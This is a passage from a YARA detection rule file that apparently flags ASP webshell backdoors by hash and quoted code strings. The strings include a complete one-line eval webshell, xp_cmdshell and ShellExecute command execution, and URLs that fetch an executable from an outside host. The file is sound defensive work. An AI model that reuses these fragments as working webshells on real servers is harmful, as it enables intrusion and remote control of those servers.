        $s16 = "x@#@&mmV^~mm/nF@#@&nsk+k6~WT+P{~EW0ErPOtnU@#@&^l^sP1ldny@#@&nsk+r0,GT+~{Prtl03bUNmJ~Y4+U@#@&ml^sP1l/" fullword ascii
        $s17 = "var message=\"SaNaLTeRoR - " fullword ascii
        $s18 = "m Bilgileri </a>- <a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?copy');\">Copright</a> -<a href=\"javascript:voi" ascii
        $s19 = "m Bilgileri </a>- <a href=\"javascript:void(0);\" onclick=\"javascript:Start ('?copy');\">Copright</a> -<a href=\"javascript:voi" ascii
        $s20 = "/n SDkOn,J@!4M@*@!0GM:,lmDkKU'QPh+DtG[{wWkO@*@!kxa;OPDXa+x/;8skOP7CV!+xErb1)~UbeszErPdby" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 30KB and ( 8 of them ) ) or ( all of them )
}

rule af8d2e02dbb61665da3e0e5440bfbfe625f39c80
{
     meta:
        description = "asp - file af8d2e02dbb61665da3e0e5440bfbfe625f39c80.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "6832aebe29516a7d0ef490ae8992866e0000ad90ab3996a70d905a5646ce4534"
     strings:
        $x1 = "codedtext = codedtext.replace(/(<form\\s[^>]*?action\\s*=\\s*['\"@])\\/?(?!#|mailto:|javascript:|http:\\/{2})/ig,\"$1\"+pre" fullword ascii
        $x2 = "codedtext = codedtext.replace(/(<a\\s[^>]*href\\s*=\\s*['\"@])\\/?(?!#|mailto:|javascript:|http:\\/{2})/ig,\"$1\"+preurl_2+\"/" fullword ascii
        $x3 = "codedtext = codedtext.replace(/(<(?:frame|iframe)\\s[^>]*(?:href|src)\\s*=\\s*['\"@])(?=http:\\/{2})/ig,\"$1?cst=\"+Scst+\"&typ" fullword ascii
        $s4 = "codedtext = codedtext.replace(/(<param\\s+name.*(?:filename|movie).*value\\s*=\\s*['\"@])\\/?(?!http:\\/{2})/ig,\"$1\"+preurl_2" fullword ascii
        $s5 = "codedtext = codedtext.replace(/(<param\\s+name.*(?:filename|movie).*value\\s*=\\s*['\"@])(?=http:\\/{2})/ig,\"$1?txt=2&url=\")" fullword ascii
        $s6 = "codedtext = codedtext.replace(/(<param\\s+name.*(?:filename|movie).*value\\s*=\\s*['\"@])(?=http:\\/{2})/ig,\"$1?txt=2&url=\");" fullword ascii
        $s7 = "codedtext = codedtext.replace(/(<form\\s[^>]*?action\\s*=\\s*['\"@])(?=http:\\/{2})/ig,\"$1?cst=\"+Scst+\"&type=\"+Stype+\"&c" fullword ascii
        $s8 = "codedtext = codedtext.replace(/(<link\\s[^>]*href\\s*=\\s*['\"@])(?=http:\\/{2})/ig,\"$1?cst=\"+Scst+\"&type=4&txt=1&url=\");" fullword ascii
        $s9 = "codedtext = codedtext.replace(/(<(?:img|input|embed)\\s[^>]*src\\s*=\\s*['\"@])(?=http:\\/{2})/ig,\"$1?txt=2&url=\");" fullword ascii
        $s10 = "codedtext = codedtext.replace(/(<(?!a\\s)[^>]*[\\s\"';]background\\s*=\\s*['\"@])(?=http:\\/{2})/ig,\"$1?txt=2&url=\");" fullword ascii
        $s11 = "http://www.aaa.com/p.asp?txt=1&type=1&cm=0&cf=12&url=http://www.bbb.com/shell.asp" fullword ascii
        $s12 = "codedtext = codedtext.replace(/(background\\s*:\\s*url\\()\\/?(?!http:\\/\\/)/ig,\"$1\"+preurl_2+\"/\");" fullword ascii
        $s13 = "var baseurl = codedtext.match(/<base[^>]+href\\s*=\\s*([\"']?)(http:\\/\\/[^\"'\\s]+?)\\1[^>]*>/i);" fullword ascii
        $s14 = "case \"google\":url = flag + \"&url=http://www.google.com.hk/search?q=\" + encodeURI(url); break;" fullword ascii
        $s15 = "case \"baidu\":url = flag + \"&url=http://www.baidu.com/baidu?word=\" + encodeURI(url) + \"&ie=utf-8\";" fullword ascii
        $s16 = "while(codedtext.match(/\\/[^\\/\\.]+\\/\\.\\.\\//)!=null) codedtext = codedtext.replace(/\\/[^\\/\\.]+\\/\\.\\.\\//, \"/\");" fullword ascii
        $s17 = "Response.AddHeader(\"Cookie\",http_request.getResponseHeader( \"Set-Cookie\" ));" fullword ascii
        $s18 = "codedtext = codedtext.replace(/(<(?:link|script)\\s[^>]*(?:href|src)\\s*=\\s*['\"@])/ig,\"$1?cst=\"+Scst+\"&type=4&txt=1&url=\"" fullword ascii
        $s19 = "Response.AddHeader(\"Content-Disposition\",\"attachment; filename=\"+preurl);" fullword ascii
        $s20 = "//codedtext = codedtext.replace(/(<(?:link|script)\\s+[^>]*(?:href|src)\\s*=\\s*['\"@])\\?/ig,\"$1\"+preurl_1+\"?\");" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 40KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_99a346657052efa0f219738950717ccd3efa467c
{
     meta:
        description = "asp - file 99a346657052efa0f219738950717ccd3efa467c.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "a66a8b7d8ce3256b961322bd21e0e012f1d1833187f57485ecf87c322cc19bc7"
     strings:
        $s1 = "Fso.CreateTextFile(DirStr&\"\\temp.tmp\")" fullword ascii
        $s2 = "Fso.DeleteFile(DirStr&\"\\temp.tmp\")" fullword ascii
        $s3 = "<input name=\"sPath\" type=\"text\" id=\"sPath\" value=\"<%=ShowPath%>\"  style=\"width:500px;height:25px\">" fullword ascii
        $s4 = "Set Fso=server.createobject(\"scr\"&\"ipt\"&\"ing\"&\".\"&\"fil\"&\"esy\"&\"ste\"&\"mob\"&\"jec\"&\"t\") " fullword ascii
        $s5 = "<form name=\"form1\" method=\"post\" action=\"\">" fullword ascii
        $s6 = "<input style=\"width:160px;height:28px\" type=\"submit\" name=\"button\" id=\"button\" value=\"" fullword ascii
        $s7 = "ShowPath=\"C:\\Program Files\\\"" fullword ascii
        $s8 = "Set Objfolder=fso.getfolder(path)" fullword ascii
        $s9 = "Nowpath=path + \"\\\" + Objsubfolder.name" fullword ascii
        $s10 = "response.write \" <font color=red>" fullword ascii
        $s11 = "response.write \" <font color=green>" fullword ascii
        $s12 = "response.write \" <font color=green><b>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 6KB and ( 8 of them ) ) or ( all of them )
}

rule sig_138c3af6c07c226a40f98c99ea747679e778cac2
{
     meta:
        description = "asp - file 138c3af6c07c226a40f98c99ea747679e778cac2.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b711be35c684efb4e64c2859841edb48f36881c447c3427ae9b1dd8371b43e64"
     strings:
        $x1 = "response.Write(\"<form name=\"\"loginform\"\" action=\"\"\"& scriptname &\"?action=LoginCheck\"\" method=\"\"post\"\">\")" fullword ascii
        $s2 = "<div id=\"index_bottom\"><A href=\"http://www.vwen.com\" target=\"\"_blank\"\">" fullword ascii
        $s3 = "Response.AddHeader \"Content-Disposition\", \"attachment; filename=\" + downfilename" fullword ascii
        $s4 = "response.redirect(scriptname&\"?action=LoginConfig&path=\"&spath&\"&commits=yes\")" fullword ascii
        $s5 = "<li><A href=\"<%=scriptname%>?action=LoginConfig&path=<%=request.querystring(\"path\")%>\">" fullword ascii
        $s6 = "for intTemp=1 to Ubound(Uploader.FileItem)" fullword ascii
        $s7 = "response.Write(\"<form name=\"\"loginform\"\" action=\"\"\"& scriptname &\"?action=LoginConfig&path=\"& spath &\"&commit=yes\"\"" ascii
        $s8 = "formName=Uploader.FileItem(intTemp)" fullword ascii
        $s9 = "<input class=\"\"login_input\"\" type=\"\"password\"\" name=\"\"loginpwd\"\"></li><li><input type=\"\"submit\"\" value=\"\"" fullword ascii
        $s10 = ".login_input{width:140px; border:1px solid #666666;}" fullword ascii
        $s11 = "if TempPath=\"./\" or TempPath=\"/\" then GotoUpFolder=TempPath else GotoUpFolder=left(Path,instrrev(Path,\"/\")-1)" fullword ascii
        $s12 = "if (md5(loginname)&\"1\")<>FileLoginName or (md5(loginpwd)&\"2\")<>FileLoginPwd then" fullword ascii
        $s13 = "Response.Write \"<div id=\"\"body_content\"\"><img src=\"\"\"&  path & sfile & \"\"\" border=\"\"1\"\"></div>\"" fullword ascii
        $s14 = "#body_login{color:#000000; font-weight:bold; padding-top:80px; text-align:center;}" fullword ascii
        $s15 = "if session(\"FileLoginErrStr\")=\"\" then session(\"FileLoginErrStr\")=0" fullword ascii
        $s16 = "strFtyp=Mid(strItem,Instr(intTemp,strItem,\"Content-Type: \")+14)" fullword ascii
        $s17 = "#index_head{color:#FFFFFF; background-color:#000000; font-weight:bold; height:24px; line-height:24px;width:100%; margin:0px;}" fullword ascii
        $s18 = "objForm.Add strInam&\"_Height\",BinVal2(binItem.Read(4))" fullword ascii
        $s19 = "objForm.Add strInam&\"_Height\",Bin2Val(binItem.Read(2))" fullword ascii
        $s20 = "objForm.Add strInam&\"_Height\",BinVal2(binItem.Read(2))" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 100KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule e72a0cbe7def83c03ada34f6701813a5f7d693bf
{
     meta:
        description = "asp - file e72a0cbe7def83c03ada34f6701813a5f7d693bf.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "5a40df588e079dc1abda3c3273579aa9ecf0f600f722e4e92cbc4cdc0703a38d"
     strings:
        $x1 = "j cdx&\"<a href='http://tool.chinaz.com/baidu/?wd=\"&str1&\"&lm=0&pn=0' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x2 = "'j cdx&\"<a href='http://www.8090sec.com/SQL/index.aspx' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $x3 = "j cdx&\"<a href='http://www.114best.com/ip/114.aspx?w=\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x4 = "j cdx&\"<a href='http://www.aizhan.com/siteall/\"&str1&\"' target='FileFrame'>\"&cxd&\" " fullword ascii
        $x5 = "TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls." fullword ascii
        $s6 = "j cdx&\"<a href='?Action=EditPower&PowerPath=\\\\.\\\"&OOOO&\"' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s7 = "j cdx&\"<a href='?Action=Cmd1Shell' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s8 = "'j cdx&\"<a href='\"&htp&\"sql.asp' target='FileFrame'>\"&cxd&\" MYSQL" fullword ascii
        $s9 = "j cdx&\"<a href='?Action=cmdx' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s10 = "ion='http://www.baidu.com/ips8.asp' name='ipform' target='_blank'><tr align='center'><td height='20' width='200' bgcolor='#FFFFF" ascii
        $s11 = "</td><td bgcolor='#FFFFFF'> </td><td bgcolor='#FFFFFF'>\"&request.serverVariables(\"SERVER_NAME\")&\"</td></tr><form method=post" ascii
        $s12 = "j cdx&\"<a href='http://tool.chinaz.com/Tools/Robot.aspx?url=\"&str1&\"&btn=+" fullword ascii
        $s13 = "j cdx&\"<a href='?Action=ProFile' target='FileFrame'>\"&cxd&\" <font color=red>" fullword ascii
        $s14 = "j cdx&\"<a href='?Action=ScanPort' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s15 = "j cdx&\"<a href='?Action=ScanDriveForm' target='FileFrame'>\"&cxd&\" " fullword ascii
        $s16 = "j cdx&\"<a href='?Action=suftp' target='FileFrame'>\"&cxd&\" Su---FTP" fullword ascii
        $s17 = "j cdx&\"<a href='?Action=radmin' target='FileFrame'>\"&cxd&\" Radmin" fullword ascii
        $s18 = "j cdx&\"<a href='?Action=Servu' target='FileFrame'>\"&cxd&\" Servu-" fullword ascii
        $s19 = "j cdx&\"<a href='?Action=MMD' target='FileFrame'>\"&cxd&\" MS--SA" fullword ascii
        $s20 = "TypeList =  \".asp.asa.bat.bmp.com.doc.db.dll.exe.gif.htm.html.inc.ini.jpg.js.log.mdb.mid.mp3.png.php.rm.rar.swf.txt.wav.xls.xml" ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule f72a86142452b74e996c6e15779092d1cd2ab1cf
{
     meta:
        description = "asp - file f72a86142452b74e996c6e15779092d1cd2ab1cf.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "65d17f1a5837f03ce4008e12d3c70cbaf1c902b57dae595a7e4f1af73f62cc01"
     strings:
        $s1 = "6Ywrs+vsbVnj.sBFSYM;+*@#@&.^kxnxrJ@#@&bW,1GDPD6YcbD3x9rW?DDnCsPY4nx@#@&D^rU+{YXY InC9bsV,~@#@&+U[,k0@#@&b0~D^r" fullword ascii
        $s2 = "D7+DcmMnlD+G4N+^OvJhk^DbwYcd4+^Vr#@#@&dnDP[N{^:c+an1`/4n^V2lD4LJ~Jm,J[9+6^:9#@#@&mlCx9NRkONKEYc.nl9l^V@#@&dr{/r[r@!Y" fullword ascii
        $s3 = "=\"http://www.baidu.com\"  '" fullword ascii
        $s4 = "'vAbNY4lvZ!i4nro4Y= X!v@*r@#@&P,~PNPdOMD+d;^Y@#@&,~,P%r@!JY+XYm.+m@*@!tM@*@!&Dl4^n@*r@#@&,~~PkYM;;+.z,'~J9.WaPOC(V+~,Nx^Tp[" fullword ascii
        $s5 = "kRNwT LkRsWTRh[(R:b[Rsw&c2Uocw4w Dh Ml.RkA0cYaOchl- XVdRXh^R\"bwcL/aRmdwXRIJ@#@&~~,Psbs+:Xw" fullword ascii
        $s6 = "Y)V^ok^+cjw1#@#@&,2UN,(6@#@&,Pg+6D@#@&~P9khPkY.o^1lsn@#@&PPwG.PAl1t~rUnwks+,(x,W8%w0@#@&~,P~/D.wVHm:" fullword ascii
        $s7 = "N~q6@#@&Uqxj&[J@!4MP^W^GM'v[2w2sAsE@*@!JY[@*@!zO.@*@!zDC4^+@*r@#@&IkR;VG/nlU+OP\"d'gWO4bxo@#@&NPjq=j&'Er@#@&PPAVkn@#@&ZGx" fullword ascii
        $s8 = "@!zDN@*E@#@&LEP@!Y[@*@!kxa;Y,xlsnxB6B,YzwnxEYn6DvPbNxv6BP-C^En'EEL0'rB,/k.+{v%E@*@!zDN@*E@#@&Lr~@!JYD@*E@#@&NJ,@!OD~C^kLx{vm" fullword ascii
        $s9 = "@#@&s!U1YrKx,HW7+wGV9+.`hlO4*@#@&hCY4'?asrYvnmY4~Ek-ukJ*@#@&&0~/wRsGs9+.2XrkYdvnmYtv!*bPmx[PhlO4vF#@!@*JrPK4nU@#@&ZwR\\W-nwWsN" fullword ascii
        $s10 = "/ORUnD7+.#mDkC8^+d`ri\"SE*~&x/DD\"n\\vIn;!+dOc?+M-+M.lMrC4^+k`Ej]Jr#SJJE#*)@#@&~lmViMVxJ@!8M@*@!(D@*@!m" fullword ascii
        $s11 = "Vswm[NbxLxE!B@*E@#@&~PU({?(LJ@!0WM:,Uls+xBG4oGM:B,h+DtW9xvwK/DB~l^ObWU'Ev@*r@#@&~,?qxj&[E@!D.@*@!O9PSkNDt{vFZ!vP4+rL4Y'E+GE@*P," fullword ascii
        $s12 = "@*J@#@&dNJ@!JWGDs@*@!zON@*@!JY.@*@!&Ym4sn@*J@#@&n^/n@#@&7NJ@!Dl(V+,hb[Y4'vvZ!v~(omKsWM'BsnUEEP(W.Nn.{BTB,^+^Vd2mmkUL{BqB,^" fullword ascii
        $s13 = "_2IA~qG@!FZTEJp?DD,*DxrJ(1U3I:P(H:rP,Pm4s+gCs+DvjU2IBnzj?*P#bdj3jv-B!d+MxlsnwBB-EwC/dAKD[-EbJrijOM$vDxrJ92d3:2~wI}HP]Km8V" fullword ascii
        $s14 = "EfKhUobV+ElGWAxwr^+~w1m:+=?4GhAD.`*@#@&^m/+r9+^sk^nE)U+DP)A/xg+APd$s=b$/cf+sobVn`wHm:n*)U+Y,b~/'gWOtbxL@#@&mlknJANkDorV" fullword ascii
        $s15 = "/OvJhDWwk^nJ*[EZKxEbBJ@!(.@*r##@*x*!,Y4+U@#@&[b:~lk4WSk^@#@&0W.~m/4WSr{!~DW,c!@#@&mdtKhrm{ld4Khk1'/aVkDc)waVbmCYrG" fullword ascii
        $s16 = "@!JA@*@!&K9@*@!K9P1GVkwCU{&@*E@#@&L~sU6cMnD?a+mbl^oW^NnDv!b@#@&LJ@!&KG@*@!:9~l^kTxx:r[9Vn@*@!(1hjP~DXwnxkE8:bO,\\C^E" fullword ascii
        $s17 = "@!z~@*@!JKf@*@!Pf,mKVdwCU{&@*J@#@&L,sj6cM+Oja+^kmswWs9+M`F*@#@&%J@!zPf@*@!P9,lVbLx{:k9[s+@*@!&1KjP~DX2+{dE(:rO,\\ls;" fullword ascii
        $s18 = "@*@!JPG@*@!Js}IH@*@!JPI@*@!PI,msCk/':$KG@*@!w6]H,l1YrWUxQb^YbGx{?^oKVNn.LsGV9nM'E@#@&NPsUrc!+D?2+1kCswWV9nDv #@#@&%J,:" fullword ascii
        $s19 = "Px~G?YC.D@#@&P,P8R/KwHKW,KySf&2UN fjOmDY@#@&P,K cKG/bYbWUPx~ZPlP:+R:X2n,'P+~=PP c/4l.k+DP'ro(+&8 E@#@&P~P&xP{~KyRI" fullword ascii
        $s20 = "lO+}8N+^D`rHk1DKdW6Y (tSuP:nJ*@#@&mRWanUPrMAKE~~E4YOw=&z8 { ZR! q=J~[,2KDO,[,JzTW^[/!x&Eal[hbxzkfJBPKM;n~,Jr~~JE@#@&l /" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule ba90f177b40d90d8415b14a4d7e7e64fc67576ff
{
     meta:
        description = "asp - file ba90f177b40d90d8415b14a4d7e7e64fc67576ff.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "c5d7e274ed454e3d85dc2465aaf870db89a4432674956264632c8f55186cffb5"
     strings:
        $s1 = "<%=\"<input name='pass' type='password' size='10'> <input \"%><%=\"type='submit' value='" fullword ascii
        $s2 = "<%=\"<center><br><form action='' method='post'>\"%>" fullword ascii
        $s3 = ":\"&server.mappath(request.servervariables(\"script_name\"))%>" fullword ascii
        $s4 = "if request(\"pass\")=\"g\" then  '" fullword ascii
        $s5 = "<%if session(\"pw\")<>\"go\" then %>" fullword ascii
        $s6 = "<%=\"<textarea name=da cols=50 rows=10 width=30></textarea>\"%>" fullword ascii
     condition:
        ( uint16(0) == 0x253c and filesize < 3KB and ( all of them ) ) or ( all of them )
}

rule sig_1937efedfec46cfd0e25df94151d977e117c0582
{
     meta:
        description = "asp - file 1937efedfec46cfd0e25df94151d977e117c0582.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "8dcbb18e02d5be2663448810946eae9f1618afebe35d779699afc9ece1bc1fcc"
     strings:
        $s1 = "[r@!z6WUY@*@!&WKxY@*@!z1+xDn.@*@!tMP^WsGM':cy* W ~dby+xq,@*@!zD[@*@!&DD@*J)&0,64:`T~8#xE," fullword ascii
        $s2 = "IcoPath=\"http://lpl38.com/web/FileType/\"'" fullword ascii
        $s3 = "~~rBPFb~{PENr~}D~tk9`/DDbU~,kSP8#~x,Jfr~K4+x,@#@&PNP{Pq&~@#@&2UN,(0,@#@&(6PHr[v/ODbUBPrBP8#P{Pr^J,r.Ptk[ckYDbU~,k~,qbP{PrZEPP4" fullword ascii
        $s4 = "/OvJhDWwk^nJ*[EZKxEb{l/4Ghbm@#@&nUN,k6@#@&L~)awsk1CYbWUcM+;;nkYcJh.Ksr^+r#[rZKUJ*@#@&+^/n@#@&LJ@!8D@*@!4M@*@!4M@*@!mnxOnM@*" fullword ascii
        $s5 = "aspxt=\"http://lpl38.com/web/aspx.txt\"'" fullword ascii
        $s6 = "durl=\"http://lpl38.com/web/pr.exe\"'" fullword ascii
        $s7 = "phpt=\"http://lpl38.com/web/php.txt\"'" fullword ascii
        $s8 = "Y~6l1+'EhbUo9kUokB~^KVWMxB[&&6WT!EPkk\"+xv2B@* @!&0KxO@*,J@#@&~,2UN,(6@#@&Ax9Ps!x1OkKx@#@&wEU^DkW" fullword ascii
        $s9 = "R]+9k.n1YPr4YDw)J&E[k+M\\nD;'rzLVK8l^RCdmJ@#@&n^/nk6~\"+5!+kY`rk1nJ*'E3bVs[KWDr~Y4+x@#@&.+kwKxd+ ]" fullword ascii
        $s10 = "s@!Jl@*P@!l~4M+0{vLm\\lk^.kaY=s;VsoKDh`rEJLInKmYtcKmY4[rwr[Jc1m:+*[rEJBJEZKwzobV+rE#EPm^Cd/{Bm:vPOrDVn'E" fullword ascii
        $s11 = "SItEuRl=\"HTTP://baidu.com/\"'" fullword ascii
        $s12 = "htp=\"http://lpl38.com/web/\"'" fullword ascii
        $s13 = "UY~Xq9cd#c/DXs+ [b/2Vmz'rJEEp88@!&km.kaO@*@!Om4^+PSk9Ot{Bq!Z]v~1+V^dwmmk" fullword ascii
        $s14 = "/ORUnD7+.#mDkC8^+d`rjAI#AI|?rwKq)IAJb[r@!&O9@*@!JOD@*J@#@&oGD,k{!~KG~8%@#@&U('Uq'E@!YD~C^kLx{v1+UD+MB@*@!Y9~t" fullword ascii
        $s15 = "PxPZ@#@&,Por^+?OCMYxPZ@#@&P~Ax9P?!4@#@&P,n;4^k^~6Ex1OkKxPUC-+z/vsb@#@&~,Nr:,P&@#@&~~Ul\\n)k'OD!n@#@&~,k6PYMkscs*'EJ,W.~wkV" fullword ascii
        $s16 = "[`kY.b@#@&In[,'~J@!o}1P,mKVWM'[W0y + @*J~',/YM~[,J@!Jo61:@*r@#@&2U[,s;x1OkKx@#@&@#@&s;U1YrW" fullword ascii
        $s17 = "R(Cm0o.W!x[/KVWMxB[!!+fT!EJrPGx\\G!/nr!O'rJO4b/RdOHVnR(C13LMW!xN;W^GD{B:!Z&TTZBJr@*J@#@&/bxdkLsbVnq^GvS 1mh+*@#@&db'/r'r@!CP4." fullword ascii
        $s18 = "Z!J,'P74ZMJWPLPrOj+ddbWUKbh+}EOx FJ~',\\8ZMJ6P',J 26akMn'ZJ~[,\\8/MS0,'PrOImOrW`w{FEP'~74/DdWPLPm@#@&PP~~,P~PrR\"lObWGWh" fullword ascii
        $s19 = "`rlJ*@#@&d+DP8'k+ddbWxvE4r#@#@&dnY,m{/n/drKxcJ1E#@#@&C m4W.O@#@&j+D~mPx,1KYtbxT@#@&(RC4KDO@#@&?+D~4,'PgGOtbxT@#@&m C(W.Y@#@&?" fullword ascii
        $s20 = "`nmY4b@#@&nCY4'j2^kYvKlDt~rkku-J*@#@&qW~;s sbs+A6rdD/`KCDtc!*b,lU9PhlY4`8b@!@*JEP:tnU@#@&Zw ZKwXwrs+,nmY4`TbBnCY4cF*@#@&j&'J@!^" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 8 of them ) ) or ( all of them )
}

rule da58f94f79a803e8a8b2931831616caeb87735ef
{
     meta:
        description = "asp - file da58f94f79a803e8a8b2931831616caeb87735ef.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "4334d3b9d075e530187d23cd7f8f067de67c3a94e6888335d8b0d4c9ca4a9187"
     strings:
        $x1 = "seshell.ShellExecute shellpath,\" /c \" & defcmd & \" > \" & sztempfile,\"\",\"open\",0" fullword ascii
        $x2 = "CONn.EXEcutE(\"Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED, thePath VarChar, fileContent Image)\")" fullword ascii
        $x3 = "'jb\"<tr><td height='22'><a href='http://tiquan.net/pr/?Submit=+%B2%E9+%D1%AF+&domain=\"&Worinima&\"' target='FileFrame'>" fullword ascii
        $x4 = "></form></tr></table>\":jb SI:SI=\"\":If trim(request.form(\"MMD\"))<>\"\"  Then:password= trim(Request.form(\"P\")):id=trim(Req" ascii
        $x5 = "jb\"<title>\"&nimajb&\" - \"&nimajbm&\" </title>\":jb\"<style type=\"\"text/css\"\">\":jb\"body,td{font-size: 12px;background-co" ascii
        $x6 = "ConnstR=\"Provider=SQLOLEDB.1;Data Source=\" & tARgETIp &\",\"& PoRtNUm &\";User ID=lake2;Password=;\"" fullword ascii
        $s7 = "'jb\"<tr><td height='22'><a href='http://tiquan.net/ip/?action=sed&cx_33=\"&ServerU&\"' target='FileFrame'>" fullword ascii
        $s8 = "<input name='ToPath' value='\"&RRePath(Session(\"FolderPath\")&\"\\Cmd.exe\")&\"' size='40'>\"" fullword ascii
        $s9 = "!)</font></a></center>\":jb\"<tr><td height='20'><a href='?Action=Upload' target='FileFrame'><center><font color=red size=5px>(" fullword ascii
        $s10 = "jb\"<input type=hidden name=\"\"#\"\" value=Execute(Session(\"\"#\"\"))>\"" fullword ascii
        $s11 = "jb\"<tr><td height='20'><a href='?Action=Cmd1Shell' target='FileFrame'>" fullword ascii
        $s12 = "'jb\"<tr><td height='22'><a href='http://tiquan.net/mmgx/index.htm' target='FileFrame'>" fullword ascii
        $s13 = "b.open \"GET\", \"http://127.0.0.1:\" & ftpport & \"/M_Schumacher/upadmin/s2\", True, \"\", \"\"" fullword ascii
        $s14 = "\"exec master.dbo.xp_cMdsHeLl '\" & request.form(\"MMD\") & \"'\":set recResult = adoConn.Execute(strQuery):If NOT recResult.EOF" ascii
        $s15 = "xpost3.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s16 = "xpost.open \"POST\", \"http://127.0.0.1:\"& port &\"/leaves\", true" fullword ascii
        $s17 = "a.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s1\",True, \"\", \"\"" fullword ascii
        $s18 = "c.open \"GET\", \"http://127.0.0.1:\" & port & \"/M_Schumacher/upadmin/s3\", True, \"\", \"\"" fullword ascii
        $s19 = "jb\"<tr><td height='20'><a href='?Action=hiddenshell' target='FileFrame'>" fullword ascii
        $s20 = "CONN.ExecUtE(sqlSTR)" fullword ascii
     condition:
        ( uint16(0) == 0x6f3c and filesize < 300KB and ( 1 of ($x*) and 4 of them ) ) or ( all of them )
}

rule sig_6985d16c69b1ebeaf01dc4d5e9360f2a684e5fa5
{
     meta:
        description = "asp - file 6985d16c69b1ebeaf01dc4d5e9360f2a684e5fa5.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "f5c86f2a2189ae5c8d6e46fd1b7e742def3d8846c880072e538fba4d3d5660ed"
     strings:
        $s1 = "<%eval request(\"maskshell\")%>" fullword ascii
     condition:
        ( uint16(0) == 0x6854 and filesize < 1KB and ( all of them ) ) or ( all of them )
}

rule sig_4f6b24f29d976007db17bd51c7cd0dd3ffa31e48
{
     meta:
        description = "asp - file 4f6b24f29d976007db17bd51c7cd0dd3ffa31e48.asp"
        company = "WatcherLab"
        level = 4
        type = "Backdoor.Webshell"
        date = "2018-5-28"
        hash1 = "b8957d9ce9e559b134eb2c82121b276bf4d987a99d167e2d3484d4b925437f0b"
     strings:
        $x1 = "Target = \"D:\\hshome\\masterhr\\masterhr.com\\\"  ' ---Directory to which files will be DUMPED Too and From" fullword ascii
        $s2 = "fso.CopyFile Request.QueryString(\"txtpath\") & \"\\\" & Request.Form(\"Fname\"),Target & Request.Form(\"Fname\")" fullword ascii
        $s3 = "fso.CopyFile Target & Request.Form(\"ToCopy\"), Request.Form(\"txtpath\") & \"\\\" & Request.Form(\"ToCopy\")" fullword ascii
        $s4 = "<!-- Copyright Vela iNC. Apr2003 [alturks.com] Edited By KingDefacer-->" fullword ascii
        $s5 = "Response.write \"<font face=arial size=-2>You need to click [Create] or [Delete] for folder operations to be</font>\"" fullword ascii
        $s6 = "<form method=post name=frmCopySelected action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s7 = "<BR><center><form method=post action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?txtpath=<%=MyPath%>\">" fullword ascii
        $s8 = "<table><tr><td><%If Request.Form(\"chkXML\") = \"on\"  Then getXML(myQuery) Else getTable(myQuery) %></td></tr></table></form>" fullword ascii
        $s9 = "<form method=\"post\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>\" name=\"myform\" >" fullword ascii
        $s10 = "Response.Write \"<tr><td><font color=gray>Type: </font></td><td>\" & File.ContentType & \"</td></tr>\"" fullword ascii
        $s11 = "<BR><input type=text width=40 size=60 name=txtpath value=\"<%=showPath%>\" ><input type=submit name=cmd value=\"  View  \" >" fullword ascii
        $s12 = "Document.frmSQL.txtSQL.value = \"select name as 'TablesListed' from sysobjects where xtype='U' order by name\"" fullword ascii
        $s13 = "<INPUT TYPE=\"SUBMIT\" NAME=cmd VALUE=\"Save As\" TITLE=\"This write to the file specifed and overwrite it without warning.\">" fullword ascii
        $s14 = "<input type=submit name=cmd value=Create><input type=submit name=cmd value=Delete><input type=hidden name=DirStuff value=@>" fullword ascii
        $s15 = "<INPUT type=password name=code ></td><td><INPUT name=submit type=submit value=\" Access \">" fullword ascii
        $s16 = "Document.frmSQL.txtSQL.value = \"SELECT * FROM \" & vbcrlf & \"WHERE \" & vbcrlf & \"ORDER BY \"" fullword ascii
        $s17 = "<form name=frmSQL action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>?qa=@\" method=Post>" fullword ascii
        $s18 = "<FORM method=\"post\" action=\"<%=Request.Servervariables(\"SCRIPT_NAME\")%>\" >" fullword ascii
